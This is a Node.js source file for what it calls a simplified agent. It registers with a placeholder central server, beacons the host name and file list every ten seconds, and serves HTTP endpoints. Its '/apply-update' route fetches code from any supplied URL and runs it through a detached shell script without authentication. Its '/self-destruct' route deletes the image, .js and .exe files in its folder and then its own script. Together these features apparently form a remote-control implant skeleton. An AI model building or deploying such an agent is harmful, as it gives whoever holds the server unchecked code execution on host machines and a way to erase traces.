// agent-latest.js -- simplified agent with registration, heartbeat, and update support
const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { spawn } = require('child_process');
const os = require('os');

const app = express();
app.use(express.json());
const PORT = process.env.PORT || 3001;
const DIR = __dirname;
const SERVER = process.env.SERVER_URL || 'http://REPLACE_WITH_SERVER_URL';
const SUPPORTED = ['.png','.jpg','.jpeg','.gif','.bmp','.webp'];
const id = process.env.AGENT_ID || (os.hostname() + '-' + Math.random().toString(36).slice(2,8));

function listImages(){ try{ return fs.readdirSync(DIR).filter(f=>SUPPORTED.includes(path.extname(f).toLowerCase())); }catch(e){ return []; } }

async function register(){
  try{
    const host = process.env.EXTERNAL_HOST || ('http://' + require('os').hostname() + ':' + PORT);
    await axios.post(SERVER.replace(/\/$/,'') + '/register', { id, name: process.env.PC_NAME || os.hostname(), host, files: listImages(), version: '1.0.0' }, { timeout:5000 });
    console.log('Registered to server at', SERVER);
  }catch(e){ console.log('Register failed:', e.message); }
}

setInterval(()=>{ try{ axios.post(SERVER.replace(/\/$/,'') + '/register', { id, name: process.env.PC_NAME || os.hostname(), host: process.env.EXTERNAL_HOST || ('http://' + require('os').hostname() + ':' + PORT), files: listImages(), version: '1.0.0' }).catch(()=>{}); }catch(e){} }, 10000);

app.get('/status', (req,res)=> res.json({ name: process.env.PC_NAME || os.hostname(), status: 'on', files: listImages() }));

app.post('/apply-update', async (req,res)=>{
  const { url } = req.body || {};
  if(!url) return res.status(400).json({ error:'url required' });
  try{
    const tmp = path.join(DIR, 'agent.update.tmp.js');
    const writer = fs.createWriteStream(tmp);
    const resp = await axios.get(url, { responseType:'stream', timeout:15000 });
    resp.data.pipe(writer);
    writer.on('finish', ()=>{
      try{
        const script = path.join(DIR, 'apply_update.sh');
        const content = ['#!/bin/sh','sleep 1','mv "'+tmp+'" "'+path.join(DIR,'agent.js')+'"','nohup node "'+path.join(DIR,'agent.js')+'" >/dev/null 2>&1 &','rm -- "$0"'].join('\n');
        fs.writeFileSync(script, content, { mode:0o755 });
        spawn('sh',[script],{ detached:true, stdio:'ignore', cwd:DIR }).unref();
        res.json({ ok:true, msg:'Update applied, restarting' });
        process.exit(0);
      }catch(e){
        res.status(500).json({ error:String(e) });
      }
    });
    writer.on('error', (e)=> res.status(500).json({ error:String(e) }));
  }catch(e){ res.status(500).json({ error: e.message }); }
});

app.post('/open-image', (req,res)=>{
  const file = req.body && req.body.file ? req.body.file : null;
  const files = listImages();
  const target = file && files.includes(file) ? file : (files[0]||null);
  if(!target) return res.status(404).json({ error:'no image found' });
  const plat = process.platform;
  if(plat==='win32'){ require('child_process').exec('start "" "'+path.join(DIR,target)+'"'); }
  else if(plat==='darwin'){ require('child_process').exec('open "'+path.join(DIR,target)+'"'); }
  else { require('child_process').exec('xdg-open "'+path.join(DIR,target)+'"'); }
  res.json({ ok:true, opened: target });
});

app.post('/self-destruct', (req,res)=>{
  res.json({ ok:true, msg:'Self-destruct initiated' });
  const files = fs.readdirSync(DIR).filter(f=>SUPPORTED.includes(path.extname(f).toLowerCase()) || f.endsWith('.js') || f.endsWith('.exe'));
  const sh = path.join(DIR,'cleanup.sh');
  const content = ['#!/bin/sh','sleep 2'].concat(files.map(f=>'if [ -e "'+path.join(DIR,f)+'" ]; then rm -f "'+path.join(DIR,f)+'"; fi'),'rm -- "$0"').join('\n');
  try{ fs.writeFileSync(sh, content, { mode:0o755 }); require('child_process').spawn('sh',[sh],{ detached:true, stdio:'ignore' }).unref(); }catch(e){}
  setTimeout(()=>process.exit(0),500);
});

app.listen(PORT, ()=>{ console.log('Agent listening on', PORT); register(); });
